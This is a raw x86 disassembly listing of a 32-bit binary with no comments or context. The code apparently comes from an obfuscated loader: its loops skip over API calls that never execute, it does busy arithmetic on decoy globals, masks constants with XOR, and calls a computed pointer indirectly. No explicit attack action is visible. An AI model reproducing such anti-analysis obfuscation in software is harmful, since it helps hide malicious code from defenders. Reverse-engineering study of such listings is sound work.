  4119dc:	add    al,0x22
  4119de:	test   DWORD PTR [esi+edx*1],ebp
  4119e1:	sahf   
  4119e2:	fwait
  4119e3:	test   BYTE PTR [ebp-0x46],0xb8
  4119e7:	aad    0xed
  4119e9:	sbb    ah,dl
  4119eb:	xor    dh,bl
  4119ed:	daa    
  4119ee:	mov    gs,ecx
  4119f0:	vshufps ymm4,ymm5,YMMWORD PTR [eax-0x6d],0xe4
  4119f6:	adc    DWORD PTR [edi-0x23],edi
  4119f9:	sub    BYTE PTR [ebp+0x21],dh
  4119fc:	xor    cl,ch
  4119fe:	out    dx,eax
  4119ff:	mov    al,0x4e
  411a01:	or     eax,0x949d7f2e
  411a06:	sti    
  411a07:	adc    eax,0xe3f8c8cc
  411a0c:	jns    0x411a07
  411a0e:	mov    bh,0xe9
  411a10:	jecxz  0x411a38
  411a12:	imul   ebx,DWORD PTR [ecx+0x23],0xffffffc9
  411a16:	sub    DWORD PTR [ecx],ecx
  411a18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a19:	lea    edx,[ecx+0x74dfd784]
  411a1f:	add    BYTE PTR [edx+0x5ca25fe9],0x33
  411a26:	lahf   
  411a27:	fs cmc 
  411a29:	jne    0x4119cb
  411a2b:	fstp   QWORD PTR [esi-0x75]
  411a2e:	sti    
  411a2f:	sar    DWORD PTR [edi+ebp*1+0x767b3f2e],0x13
  411a37:	ja     0x411a65
  411a39:	retf   0x95b9
  411a3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a3d:	aas    
  411a3e:	xchg   ebp,eax
  411a3f:	aam    0xf1
  411a41:	aad    0xd4
  411a43:	aas    
  411a44:	jbe    0x411a36
  411a46:	hlt    
  411a47:	and    ebx,DWORD PTR [ebp+0x50edd59f]
  411a4d:	pop    eax
  411a4e:	inc    ebp
  411a4f:	adc    esi,DWORD PTR [edx-0x510cacc0]
  411a55:	aam    0xc9
  411a57:	jae    0x411a1f
  411a59:	sti    
  411a5a:	xor    ch,BYTE PTR [ebx-0x22]
  411a5d:	adc    edi,DWORD PTR [eax+eiz*4+0x64]
  411a61:	cmp    cl,ah
  411a63:	pushf  
  411a64:	sub    BYTE PTR [ecx-0xf46b528],0xe7
  411a6b:	xchg   edx,eax
  411a6c:	mov    DWORD PTR [edx-0x45],ecx
  411a6f:	jne    0x411a9e
  411a71:	and    DWORD PTR [eax+edx*8],eax
  411a74:	mov    WORD PTR [esi-0x20],ds
  411a77:	or     eax,0x1a006ffb
  411a7c:	lods   eax,DWORD PTR ds:[esi]
  411a7d:	or     DWORD PTR [edi],edi
  411a7f:	iret   
  411a80:	jno    0x411a38
  411a82:	ret    
  411a83:	or     edx,DWORD PTR [edx]
  411a85:	mov    bl,0x7d
  411a87:	pop    es
  411a88:	mov    ds:0x820267b1,eax
  411a8d:	int    0x36
  411a8f:	and    eax,0xe94f3fdf
  411a94:	mov    dh,0x74
  411a96:	push   esp
  411a97:	loope  0x411a5e
  411a99:	push   edi
  411a9a:	pop    ds
  411a9b:	xchg   ecx,eax
  411a9c:	inc    esp
  411a9d:	les    ebx,FWORD PTR [ecx]
  411a9f:	inc    ecx
  411aa0:	sbb    dh,ch
  411aa2:	imul   ebp,DWORD PTR [ebx-0x33],0x24d6f78e
  411aa9:	lock mov ds:0x66f3d66a,al
  411aaf:	inc    ebx
  411ab0:	xor    al,0x16
  411ab2:	jno    0x411a9b
  411ab4:	pop    ebp
  411ab5:	jge    0x411acb
  411ab7:	jp     0x411ab5
  411ab9:	js     0x411aee
  411abb:	into   
  411abc:	lea    eax,[ecx+eax*1+0x3272f3]
  411ac3:	mov    ecx,DWORD PTR [ebp+0x8]
  411ac6:	mov    edx,DWORD PTR [ebp-0x20]
  411ac9:	mov    DWORD PTR [edx+ecx*4],eax
  411acc:	mov    eax,DWORD PTR [ebp-0xc]
  411acf:	mov    ecx,DWORD PTR [ebp+0x8]
  411ad2:	xor    eax,esi
  411ad4:	lea    eax,[eax+ecx*1+0x3272f3]
  411adb:	mov    DWORD PTR [ebp+0x8],eax
  411ade:	mov    eax,DWORD PTR [ebp-0xc]
  411ae1:	mov    ecx,DWORD PTR [ebp+0x14]
  411ae4:	xor    eax,esi
  411ae6:	add    eax,edi
  411ae8:	imul   eax,DWORD PTR [ecx]
  411aeb:	mov    ecx,DWORD PTR [ebp-0x4]
  411aee:	mov    edx,DWORD PTR [ebp+0x8]
  411af1:	xor    ecx,esi
  411af3:	lea    ecx,[ecx+edx*1+0x3272f3]
  411afa:	cmp    ecx,eax
  411afc:	jne    0x40f6ee
  411b02:	mov    eax,DWORD PTR [ebp-0x4]
  411b05:	xor    eax,esi
  411b07:	add    eax,edi
  411b09:	mov    DWORD PTR [ebp-0x10],eax
  411b0c:	mov    ebx,0x65655
  411b11:	add    ebx,0x3234
  411b17:	xchg   ebx,esi
  411b19:	xor    ebx,ebx
  411b1b:	push   esi
  411b1c:	mov    esi,ebx
  411b1e:	pop    ebx
  411b1f:	mov    edx,esi
  411b21:	add    ebx,0x1002
  411b27:	lea    eax,[ebp-0x18]
  411b2a:	add    edx,eax
  411b2c:	add    edx,0x5
  411b2f:	push   edx
  411b30:	inc    esi
  411b31:	pop    ecx
  411b32:	dec    ecx
  411b33:	xchg   ecx,eax
  411b34:	dec    eax
  411b35:	xchg   ecx,eax
  411b36:	dec    ecx
  411b37:	xchg   ecx,edx
  411b39:	dec    edx
  411b3a:	push   edx
  411b3b:	mov    edx,ebx
  411b3d:	pop    ebx
  411b3e:	dec    ebx
  411b3f:	call   DWORD PTR [ebx]
  411b41:	cmp    DWORD PTR [ebp+0x10],esi
  411b44:	je     0x411b65
  411b4a:	xchg   edx,eax
  411b4b:	push   0xc
  411b4d:	pop    ecx
  411b4e:	dec    ecx
  411b4f:	push   0x3
  411b51:	pop    ebx
  411b52:	inc    ebx
  411b53:	xchg   ebx,ecx
  411b55:	inc    ecx
  411b56:	sub    ebx,ecx
  411b58:	xchg   ebx,ecx
  411b5a:	dec    ecx
  411b5b:	dec    ecx
  411b5c:	mov    eax,DWORD PTR [ebp-0x1c]
  411b5f:	imul   eax,ecx
  411b62:	add    esp,eax
  411b64:	xchg   edx,eax
  411b65:	push   eax
  411b66:	xor    ebx,ebx
  411b68:	mov    edx,esp
  411b6a:	dec    edx
  411b6b:	inc    ebx
  411b6c:	add    ebx,DWORD PTR [edx+ebx*1]
  411b6f:	dec    ebx
  411b70:	xor    edx,edx
  411b72:	add    DWORD PTR [ebp-0x10],ebx
  411b75:	pop    ebx
  411b76:	mov    eax,DWORD PTR [ebp-0x10]
  411b79:	pop    edi
  411b7a:	pop    esi
  411b7b:	pop    ebx
  411b7c:	leave  
  411b7d:	ret    0x10
  411b80:	push   ebp
  411b81:	mov    ebp,esp
  411b83:	push   ecx
  411b84:	and    DWORD PTR ds:0x4291db,ecx
  411b8a:	mov    DWORD PTR [ebp-0x4],0xf89c85bd
  411b91:	and    DWORD PTR ds:0x4291cb,0x0
  411b9b:	mov    ecx,DWORD PTR ds:0x4291cb
  411ba1:	inc    ecx
  411ba2:	mov    DWORD PTR ds:0x4291cb,ecx
  411ba8:	cmp    DWORD PTR ds:0x4291cb,0x20
  411baf:	jbe    0x411bd2
  411bb5:	jmp    0x411bc5
  411bba:	push   0x4291cf
  411bbf:	call   DWORD PTR ds:0x42a7a3
  411bc5:	cmp    DWORD PTR ds:0x4291cb,0x1c
  411bcc:	jb     0x411b9b
  411bd2:	mov    eax,DWORD PTR [ebp-0x4]
  411bd5:	xor    DWORD PTR ds:0x4291d7,0x42915f
  411bdf:	mov    edx,DWORD PTR [ebp+0x10]
  411be2:	mov    ecx,0x75108ac
  411be7:	sbb    DWORD PTR ds:0x42919f,0x2976
  411bf1:	xor    eax,ecx
  411bf3:	xor    DWORD PTR ds:0x429167,0x4291ab
  411bfd:	add    eax,0x3272f3
  411c02:	mov    DWORD PTR [edx],eax
  411c04:	and    eax,DWORD PTR ds:0x4291e7
  411c0a:	mov    eax,DWORD PTR [ebp+0xc]
  411c0d:	and    DWORD PTR ds:0x4291d3,edi
  411c13:	xor    eax,ecx
  411c15:	xor    DWORD PTR ds:0x429187,0x6377
  411c1f:	push   esi
  411c20:	xor    edx,DWORD PTR ds:0x42915b
  411c26:	mov    esi,DWORD PTR [ebp+0x10]
  411c29:	mov    edx,0x3272f3
  411c2e:	add    eax,edx
  411c30:	mov    DWORD PTR [esi+0x4],eax
  411c33:	mov    eax,DWORD PTR [ebp+0x14]
  411c36:	mov    esi,DWORD PTR [ebp+0x10]
  411c39:	mov    DWORD PTR [esi+0x8],eax
  411c3c:	mov    eax,DWORD PTR [ebp+0x18]
  411c3f:	mov    esi,DWORD PTR [ebp+0x10]
  411c42:	mov    DWORD PTR [esi+0xc],eax
  411c45:	mov    eax,DWORD PTR [ebp+0x1c]
  411c48:	mov    esi,DWORD PTR [ebp+0x10]
  411c4b:	mov    DWORD PTR [esi+0x10],eax
  411c4e:	mov    eax,DWORD PTR [ebp+0x8]
  411c51:	xor    eax,ecx
  411c53:	add    eax,edx
  411c55:	pop    esi
  411c56:	leave  
  411c57:	ret    0x18
  411c5a:	push   ebp
  411c5b:	mov    ebp,esp
  411c5d:	sub    esp,0x9c
  411c63:	movzx  ecx,BYTE PTR ds:0x429187
  411c6a:	or     DWORD PTR ds:0x4291f3,ecx
  411c70:	mov    ecx,DWORD PTR [ebp+0x8]
  411c73:	mov    eax,0x8a99
  411c78:	sub    DWORD PTR ds:0x4291a7,0x19e0
  411c82:	xor    ax,WORD PTR [ecx+0x20]
  411c86:	mov    ecx,0x3b5b
  411c8b:	add    ax,cx
  411c8e:	and    DWORD PTR ds:0x4291f7,0x0
  411c98:	mov    ecx,DWORD PTR ds:0x4291f7
  411c9e:	inc    ecx
  411c9f:	mov    DWORD PTR ds:0x4291f7,ecx
  411ca5:	cmp    DWORD PTR ds:0x4291f7,0x11
  411cac:	jl     0x411cec
  411cb2:	jmp    0x411cc5
  411cb7:	push   DWORD PTR [ebp-0x28]
  411cba:	push   0x42806d
  411cbf:	call   DWORD PTR ds:0x42a7a7
  411cc5:	cmp    DWORD PTR ds:0x4291f7,0x10
  411ccc:	jne    0x411cdf
  411cd2:	mov    ecx,DWORD PTR ds:0x4291f7
  411cd8:	inc    ecx
  411cd9:	mov    DWORD PTR ds:0x4291f7,ecx
  411cdf:	cmp    DWORD PTR ds:0x4291f7,0x1c
  411ce6:	jb     0x411c98
  411cec:	movzx  eax,ax
  411cef:	mov    DWORD PTR [ebp-0x10],eax
  411cf2:	mov    BYTE PTR [ebp-0x1],0x82
  411cf6:	and    DWORD PTR ds:0x4291df,0x0
  411d00:	jmp    0x411d14
  411d05:	xor    ecx,ecx
  411d07:	add    ecx,DWORD PTR ds:0x4291df
  411d0d:	inc    ecx
  411d0e:	mov    DWORD PTR ds:0x4291df,ecx
  411d14:	cmp    DWORD PTR ds:0x4291df,0x1b
  411d1b:	jae    0x411d48
  411d21:	cmp    DWORD PTR ds:0x4291df,0x22
  411d28:	jge    0x411d48
  411d2e:	jmp    0x411d43
  411d33:	push   0x4280f2
  411d38:	push   0x0
  411d3a:	push   DWORD PTR [ebp-0x1c]
  411d3d:	call   DWORD PTR ds:0x42a7af
  411d43:	jmp    0x411d05
  411d48:	lea    eax,[ebp-0x1]
  411d4b:	inc    DWORD PTR ds:0x42919b
  411d51:	mov    DWORD PTR [ebp-0xc],eax
  411d54:	mov    al,BYTE PTR [ebp-0x1]
  411d57:	and    DWORD PTR ds:0x4291af,0x0
  411d61:	mov    ecx,DWORD PTR ds:0x4291af
  411d67:	inc    ecx
  411d68:	mov    DWORD PTR ds:0x4291af,ecx
  411d6e:	cmp    DWORD PTR ds:0x4291af,0x19
  411d75:	jbe    0x411d96
  411d7b:	jmp    0x411d89
  411d80:	push   DWORD PTR [ebp-0x20]
  411d83:	call   DWORD PTR ds:0x42a7b3
  411d89:	cmp    DWORD PTR ds:0x4291af,0x10
  411d90:	jb     0x411d61
  411d96:	mov    ecx,DWORD PTR [ebp-0xc]
  411d99:	xor    al,0x7d
  411d9b:	mov    DWORD PTR ds:0x4291bb,0x2666
  411da5:	add    al,0x2
  411da7:	and    DWORD PTR ds:0x4291c3,0x42917f
  411db1:	mov    BYTE PTR [ecx],al
  411db3:	sbb    DWORD PTR ds:0x4291eb,0x5717
  411dbd:	mov    DWORD PTR [ebp-0x18],0xf89c85a1
  411dc4:	push   ebx
  411dc5:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  411dcc:	mov    DWORD PTR ds:0x4291eb,0x16
  411dd6:	cmp    DWORD PTR ds:0x4291eb,0x0
  411ddd:	je     0x411e17
  411de3:	cmp    DWORD PTR ds:0x4291eb,0x1e
  411dea:	jl     0x411e17
  411df0:	jmp    0x411e07
  411df5:	push   0x428010
  411dfa:	push   0x0
  411dfc:	push   0x6e74
  411e01:	call   DWORD PTR ds:0x42a7b7
  411e07:	mov    eax,ds:0x4291eb
  411e0c:	dec    eax
  411e0d:	mov    ds:0x4291eb,eax
  411e12:	jmp    0x411dd6
  411e17:	mov    ecx,DWORD PTR [ebp-0x18]
  411e1a:	or     DWORD PTR ds:0x429153,ebx
  411e20:	push   esi
  411e21:	mov    eax,0x75108ac
  411e26:	xor    esi,esi
  411e28:	xor    esi,DWORD PTR ds:0x4291b7
  411e2e:	or     DWORD PTR ds:0x42915b,esi
  411e34:	xor    ecx,eax
  411e36:	mov    esi,DWORD PTR ds:0x4291a3
  411e3c:	sbb    esi,DWORD PTR ds:0x42914f
  411e42:	mov    DWORD PTR ds:0x4291a3,esi
  411e48:	mov    esi,0x3272f3
  411e4d:	push   edi
  411e4e:	add    ecx,esi
  411e50:	jmp    0x411e66
  411e55:	inc    DWORD PTR ds:0x429163
  411e5b:	mov    dl,BYTE PTR [ebp-0x1]
  411e5e:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  411e65:	inc    ecx
  411e66:	mov    DWORD PTR ds:0x42917b,0x7bd4
  411e70:	cmp    ecx,0x40
  411e73:	jb     0x411e55
  411e79:	not    edx
  411e7b:	mov    edx,DWORD PTR [ebp-0x18]
  411e7e:	xor    edx,eax
  411e80:	mov    DWORD PTR ds:0x4291f7,0x3db0
  411e8a:	add    edx,esi
  411e8c:	jmp    0x411f80
  411e91:	movzx  edi,WORD PTR ds:0x42918b
  411e98:	or     DWORD PTR ds:0x429157,edi
  411e9e:	mov    edi,DWORD PTR [ebp+0x8]
  411ea1:	adc    DWORD PTR ds:0x42917b,edx
  411ea7:	mov    ecx,0x8a99
  411eac:	adc    DWORD PTR ds:0x4291f3,0x3816
  411eb6:	xor    cx,WORD PTR [edi+edx*4+0x2]
  411ebb:	and    DWORD PTR ds:0x4291a3,0x0
  411ec5:	jmp    0x411ed7
  411eca:	mov    edi,DWORD PTR ds:0x4291a3
  411ed0:	inc    edi
  411ed1:	mov    DWORD PTR ds:0x4291a3,edi
  411ed7:	cmp    DWORD PTR ds:0x4291a3,0x1f
  411ede:	jae    0x411f1d
  411ee4:	cmp    DWORD PTR ds:0x4291a3,0xa
  411eeb:	jl     0x411f1d
  411ef1:	jmp    0x411efc
  411ef6:	call   DWORD PTR ds:0x42a7bb
  411efc:	cmp    DWORD PTR ds:0x4291a3,0x9
  411f03:	jne    0x411f18
  411f09:	xor    edi,edi
  411f0b:	xor    edi,DWORD PTR ds:0x4291a3
  411f11:	inc    edi
  411f12:	mov    DWORD PTR ds:0x4291a3,edi
  411f18:	jmp    0x411eca
  411f1d:	mov    edi,0x3b5b
  411f22:	add    cx,di
  411f25:	add    DWORD PTR ds:0x4291ef,0x4291b7
  411f2f:	movzx  ecx,cx
  411f32:	sbb    DWORD PTR ds:0x42914b,0x16d8
  411f3c:	mov    DWORD PTR [ebp-0xc],ecx
  411f3f:	movzx  ecx,WORD PTR ds:0x42918f
  411f46:	and    DWORD PTR ds:0x429197,ecx
  411f4c:	mov    ecx,DWORD PTR [ebp+0x8]
  411f4f:	sbb    DWORD PTR ds:0x42915b,0x631a
  411f59:	movzx  ecx,WORD PTR [ecx+edx*4]
  411f5d:	xor    ecx,0x8a99
  411f63:	add    ecx,edi
  411f65:	mov    edi,DWORD PTR [ebp-0xc]
  411f68:	mov    DWORD PTR ds:0x4291f7,0x4ad9
  411f72:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  411f79:	mov    DWORD PTR ds:0x4291e7,ecx
  411f7f:	inc    edx
  411f80:	not    ecx
  411f82:	mov    ecx,DWORD PTR [ebp-0x10]
  411f85:	mov    DWORD PTR ds:0x42914f,0x2d30
  411f8f:	cmp    edx,ecx
  411f91:	jne    0x411e91
  411f97:	and    edx,edx
  411f99:	mov    ecx,DWORD PTR [ebp-0x18]
  411f9c:	sub    edi,DWORD PTR ds:0x42914f
  411fa2:	mov    edx,DWORD PTR [ebp+0x10]
  411fa5:	xor    DWORD PTR ds:0x4291bf,0xf9d
  411faf:	xor    ecx,eax
  411fb1:	and    DWORD PTR ds:0x4291b7,ebx
  411fb7:	add    ecx,esi
  411fb9:	mov    DWORD PTR [edx],ecx
  411fbb:	mov    ecx,DWORD PTR [ebp-0x18]
  411fbe:	sbb    DWORD PTR ds:0x42919f,0x1e81
  411fc8:	xor    ecx,eax
  411fca:	add    ecx,esi
  411fcc:	adc    DWORD PTR ds:0x4291e3,edi
  411fd2:	mov    DWORD PTR [ebp-0xc],ecx
  411fd5:	add    DWORD PTR ds:0x42914f,0x6cdc
  411fdf:	mov    DWORD PTR [ebp+0x8],0xf89c85a1
  411fe6:	mov    DWORD PTR ds:0x4291bf,0x1d36
  411ff0:	mov    DWORD PTR [ebp-0x14],0xf89c85b1
  411ff7:	mov    DWORD PTR [ebp-0x10],0xf89c95a1
  411ffe:	mov    ecx,DWORD PTR [ebp-0x14]
  412001:	mov    DWORD PTR ds:0x4291e3,0x1b
  41200b:	cmp    DWORD PTR ds:0x4291e3,0x0
  412012:	je     0x41204c
  412018:	cmp    DWORD PTR ds:0x4291e3,0x1c
  41201f:	jb     0x41204c
  412025:	jmp    0x41203a
  41202a:	push   0x42915f
  41202f:	push   0x428022
  412034:	call   DWORD PTR ds:0x42a7bf
  41203a:	mov    edi,DWORD PTR ds:0x4291e3
  412040:	dec    edi
  412041:	mov    DWORD PTR ds:0x4291e3,edi
  412047:	jmp    0x41200b
  41204c:	mov    DWORD PTR [ebp+0x8],ecx
  41204f:	mov    ecx,DWORD PTR [ebp+0x8]
  412052:	xor    ecx,eax
  412054:	add    ecx,esi
  412056:	movzx  ecx,WORD PTR ds:0x4291b3
  41205d:	mov    ecx,0x242ebcd
  412062:	mov    edi,0xf641bcc
  412067:	je     0x414acc
  41206d:	mov    edx,DWORD PTR [ebp+0x8]
  412070:	sub    DWORD PTR ds:0x42917b,0x1976
  41207a:	mov    ebx,DWORD PTR [ebp-0x8]
  41207d:	xor    edx,eax
  41207f:	xor    ebx,eax
  412081:	not    DWORD PTR ds:0x4291d3
  412087:	sub    edx,ebx
  412089:	not    DWORD PTR ds:0x42918f
  41208f:	sub    edx,esi
  412091:	xor    edx,eax
  412093:	and    DWORD PTR ds:0x4291cb,0x0
  41209d:	jmp    0x4120af
  4120a2:	mov    ebx,DWORD PTR ds:0x4291cb
  4120a8:	inc    ebx
  4120a9:	mov    DWORD PTR ds:0x4291cb,ebx
  4120af:	cmp    DWORD PTR ds:0x4291cb,0x18
  4120b6:	jae    0x4120f8
  4120bc:	cmp    DWORD PTR ds:0x4291cb,0xa
  4120c3:	ja     0x4120f8
  4120c9:	jmp    0x4120d9
  4120ce:	push   0x4a1a
  4120d3:	call   DWORD PTR ds:0x42a7c3
  4120d9:	cmp    DWORD PTR ds:0x4291cb,0x9
  4120e0:	jne    0x4120f3
  4120e6:	mov    ebx,DWORD PTR ds:0x4291cb
  4120ec:	inc    ebx
  4120ed:	mov    DWORD PTR ds:0x4291cb,ebx
  4120f3:	jmp    0x4120a2
  4120f8:	mov    DWORD PTR [ebp+0x8],edx
  4120fb:	sub    DWORD PTR ds:0x4291e3,0x2e82
  412105:	mov    edx,DWORD PTR [ebp+0x8]
  412108:	mov    ebx,DWORD PTR [ebp-0x58]
  41210b:	mov    DWORD PTR ds:0x42919b,0x1dc1
  412115:	add    edx,0x5708e2
  41211b:	and    DWORD PTR ds:0x4291e7,0x42919f
  412125:	imul   edx,ebx
  412128:	mov    DWORD PTR [ebp-0x58],edx
  41212b:	xor    edx,0x49c6
  412131:	mov    edx,DWORD PTR [ebp+0x8]
  412134:	mov    ebx,DWORD PTR ds:0x42914b
  41213a:	add    DWORD PTR ds:0x4291e3,ebx
  412140:	mov    ebx,DWORD PTR [ebp-0x54]
  412143:	add    edx,0x64f89c
  412149:	inc    DWORD PTR ds:0x42917f
  41214f:	or     edx,ebx
  412151:	mov    DWORD PTR [ebp-0x54],edx
  412154:	mov    edx,DWORD PTR [ebp+0x8]
  412157:	mov    ebx,DWORD PTR [ebp-0x50]
  41215a:	sbb    DWORD PTR ds:0x429183,0x4291b7
  412164:	add    edx,ecx
  412166:	xor    edx,ebx
  412168:	mov    DWORD PTR [ebp-0x50],edx
  41216b:	dec    ebx
  41216c:	mov    edx,DWORD PTR [ebp+0x8]
  41216f:	add    ebx,0x68ce
  412175:	mov    ebx,DWORD PTR [ebp-0x4c]
  412178:	add    edx,edi
  41217a:	and    edx,ebx
  41217c:	and    ebx,0x35bf
  412182:	mov    DWORD PTR [ebp-0x4c],edx
  412185:	xor    DWORD PTR ds:0x4291d3,ebx
  41218b:	mov    edx,DWORD PTR [ebp+0x8]
  41218e:	sub    DWORD PTR ds:0x4291cf,0x55b5
  412198:	mov    ebx,DWORD PTR [ebp-0x48]
  41219b:	lea    edx,[ebx+edx*1+0x241fcdf]
  4121a2:	mov    DWORD PTR [ebp-0x48],edx
  4121a5:	and    DWORD PTR ds:0x429173,0x0
  4121af:	mov    ebx,DWORD PTR ds:0x429173
  4121b5:	inc    ebx
  4121b6:	mov    DWORD PTR ds:0x429173,ebx
  4121bc:	cmp    DWORD PTR ds:0x429173,0x19
  4121c3:	jge    0x4121ee
  4121c9:	jmp    0x4121e1
  4121ce:	push   0x4291f7
  4121d3:	push   0x429187
  4121d8:	push   DWORD PTR [ebp-0x10]
  4121db:	call   DWORD PTR ds:0x42a7cb
  4121e1:	cmp    DWORD PTR ds:0x429173,0x12
  4121e8:	jb     0x4121af
  4121ee:	mov    edx,DWORD PTR [ebp+0x8]
  4121f1:	or     DWORD PTR ds:0x4291df,ebx
  4121f7:	mov    ebx,0xfa5e1528
  4121fc:	sub    ebx,edx
  4121fe:	movzx  edx,WORD PTR ds:0x4291c7
  412205:	and    DWORD PTR ds:0x4291f7,edx
  41220b:	add    ebx,DWORD PTR [ebp-0x44]
  41220e:	mov    DWORD PTR [ebp-0x44],ebx
  412211:	and    DWORD PTR ds:0x4291db,0x4291bf
  41221b:	mov    edx,DWORD PTR [ebp+0x8]
  41221e:	xor    edx,eax
  412220:	adc    DWORD PTR ds:0x429153,0x429187
  41222a:	add    edx,esi
  41222c:	mov    DWORD PTR ds:0x42915b,0x2aa5
  412236:	jne    0x41206d
  41223c:	mov    DWORD PTR ds:0x4291af,0x939
  412246:	jmp    0x414acc
  41224b:	xor    DWORD PTR ds:0x4291cb,0x4110
  412255:	mov    edx,DWORD PTR [ebp-0xc]
  412258:	sub    DWORD PTR ds:0x42918b,0x429163
  412262:	sub    edx,esi
  412264:	xor    edx,eax
  412266:	mov    DWORD PTR ds:0x4291b7,0x1c
  412270:	cmp    DWORD PTR ds:0x4291b7,0x0
  412277:	je     0x4122ae
  41227d:	cmp    DWORD PTR ds:0x4291b7,0x21
  412284:	jbe    0x4122ae
  41228a:	jmp    0x41229a
  41228f:	push   0x337f
  412294:	call   DWORD PTR ds:0x42a793
  41229a:	xor    ebx,ebx
  41229c:	or     ebx,DWORD PTR ds:0x4291b7
  4122a2:	dec    ebx
  4122a3:	mov    DWORD PTR ds:0x4291b7,ebx
  4122a9:	jmp    0x412270
  4122ae:	mov    DWORD PTR [ebp-0x5c],edx
  4122b1:	sub    DWORD PTR ds:0x429173,0x5ea2
  4122bb:	mov    edx,DWORD PTR [ebp-0x10]
  4122be:	mov    ebx,DWORD PTR [ebp-0x8]
  4122c1:	xor    edx,eax
  4122c3:	dec    DWORD PTR ds:0x4291b7
  4122c9:	xor    ebx,eax
  4122cb:	adc    DWORD PTR ds:0x429197,0x42917b
  4122d5:	sub    edx,ebx
  4122d7:	sub    edx,esi
  4122d9:	xor    edx,eax
  4122db:	mov    DWORD PTR [ebp-0x10],edx
  4122de:	mov    edx,DWORD PTR [ebp-0x14]
  4122e1:	mov    DWORD PTR [ebp+0x8],edx
  4122e4:	jmp    0x412527
  4122e9:	mov    edx,DWORD PTR [ebp+0x8]
  4122ec:	mov    DWORD PTR ds:0x429157,0x1c
  4122f6:	cmp    DWORD PTR ds:0x429157,0x0
  4122fd:	je     0x412341
  412303:	cmp    DWORD PTR ds:0x429157,0x21
  41230a:	jl     0x412341
  412310:	jmp    0x41232f
  412315:	push   0x4cc6
  41231a:	push   0x428152
  41231f:	push   0x428140
  412324:	push   0x400000
  412329:	call   DWORD PTR ds:0x42a79b
  41232f:	mov    ebx,DWORD PTR ds:0x429157
  412335:	dec    ebx
  412336:	mov    DWORD PTR ds:0x429157,ebx
  41233c:	jmp    0x4122f6
  412341:	mov    ebx,DWORD PTR [ebp-0x8]
  412344:	xor    edx,eax
  412346:	xor    ebx,eax
  412348:	sub    edx,ebx
  41234a:	sub    edx,esi
  41234c:	xor    edx,eax
  41234e:	mov    DWORD PTR [ebp+0x8],edx
  412351:	mov    edx,DWORD PTR [ebp+0x8]
  412354:	mov    ebx,DWORD PTR [ebp-0x58]
  412357:	add    edx,0x5708e2
  41235d:	add    DWORD PTR ds:0x42918f,0x4291b7
  412367:	imul   edx,ebx
  41236a:	mov    DWORD PTR [ebp-0x58],edx
  41236d:	and    DWORD PTR ds:0x4291df,0x0
  412377:	mov    edx,DWORD PTR ds:0x4291df
  41237d:	inc    edx
  41237e:	mov    DWORD PTR ds:0x4291df,edx
  412384:	cmp    DWORD PTR ds:0x4291df,0x9
  41238b:	jb     0x4123cb
  412391:	jmp    0x4123a4
  412396:	push   DWORD PTR [ebp-0x24]
  412399:	push   0x400000
  41239e:	call   DWORD PTR ds:0x42a79f
  4123a4:	cmp    DWORD PTR ds:0x4291df,0x8
  4123ab:	jne    0x4123be
  4123b1:	mov    edx,DWORD PTR ds:0x4291df
  4123b7:	inc    edx
  4123b8:	mov    DWORD PTR ds:0x4291df,edx
  4123be:	cmp    DWORD PTR ds:0x4291df,0x10
  4123c5:	jb     0x412377
  4123cb:	mov    edx,DWORD PTR [ebp+0x8]
  4123ce:	adc    ebx,DWORD PTR ds:0x429183
  4123d4:	mov    ebx,DWORD PTR [ebp-0x54]
  4123d7:	add    DWORD PTR ds:0x4291ef,0x468d
  4123e1:	add    edx,0x64f89c
  4123e7:	or     edx,ebx
  4123e9:	mov    DWORD PTR [ebp-0x54],edx
  4123ec:	and    DWORD PTR ds:0x429187,0x0
  4123f6:	jmp    0x412408
  4123fb:	mov    ebx,DWORD PTR ds:0x429187
  412401:	inc    ebx
  412402:	mov    DWORD PTR ds:0x429187,ebx
  412408:	cmp    DWORD PTR ds:0x429187,0x1d
  41240f:	jae    0x412437
  412415:	cmp    DWORD PTR ds:0x429187,0x1e
  41241c:	jg     0x412437
  412422:	jmp    0x412432
  412427:	push   0x4291cf
  41242c:	call   DWORD PTR ds:0x42a7a3
  412432:	jmp    0x4123fb
  412437:	mov    edx,DWORD PTR [ebp+0x8]
  41243a:	mov    ebx,DWORD PTR [ebp-0x50]
  41243d:	and    DWORD PTR ds:0x4291db,0x4291cf
  412447:	add    edx,ecx
  412449:	mov    DWORD PTR ds:0x42919b,0x55c4
  412453:	xor    edx,ebx
  412455:	mov    DWORD PTR [ebp-0x50],edx
  412458:	sub    DWORD PTR ds:0x42915f,0x3296
  412462:	mov    edx,DWORD PTR [ebp+0x8]
  412465:	mov    ebx,DWORD PTR [ebp-0x4c]
  412468:	xor    DWORD PTR ds:0x4291a7,0x42916b
  412472:	add    edx,edi
  412474:	xor    DWORD PTR ds:0x4291e7,0x4291af
  41247e:	and    edx,ebx
  412480:	or     DWORD PTR ds:0x42915f,edx
  412486:	mov    DWORD PTR [ebp-0x4c],edx
  412489:	mov    ebx,DWORD PTR ds:0x42918b
  41248f:	sbb    DWORD PTR ds:0x429157,ebx
  412495:	mov    edx,DWORD PTR [ebp+0x8]
  412498:	xor    DWORD PTR ds:0x429157,0x429153
  4124a2:	mov    ebx,DWORD PTR [ebp-0x48]
  4124a5:	lea    edx,[ebx+edx*1+0x241fcdf]
  4124ac:	mov    DWORD PTR [ebp-0x48],edx
  4124af:	and    DWORD PTR ds:0x429173,0x0
  4124b9:	jmp    0x4124cb
  4124be:	mov    edx,DWORD PTR ds:0x429173
  4124c4:	inc    edx
  4124c5:	mov    DWORD PTR ds:0x429173,edx
  4124cb:	cmp    DWORD PTR ds:0x429173,0x15
  4124d2:	jae    0x412517
  4124d8:	cmp    DWORD PTR ds:0x429173,0x5
  4124df:	jle    0x412517
  4124e5:	jmp    0x4124f8
  4124ea:	push   DWORD PTR [ebp-0x18]
  4124ed:	push   0x42808a
  4124f2:	call   DWORD PTR ds:0x42a7a7
  4124f8:	cmp    DWORD PTR ds:0x429173,0x4
  4124ff:	jne    0x412512
  412505:	mov    edx,DWORD PTR ds:0x429173
  41250b:	inc    edx
  41250c:	mov    DWORD PTR ds:0x429173,edx
  412512:	jmp    0x4124be
  412517:	mov    edx,DWORD PTR [ebp+0x8]
  41251a:	mov    ebx,0xfa5e1528
  41251f:	sub    ebx,edx
  412521:	add    ebx,DWORD PTR [ebp-0x44]
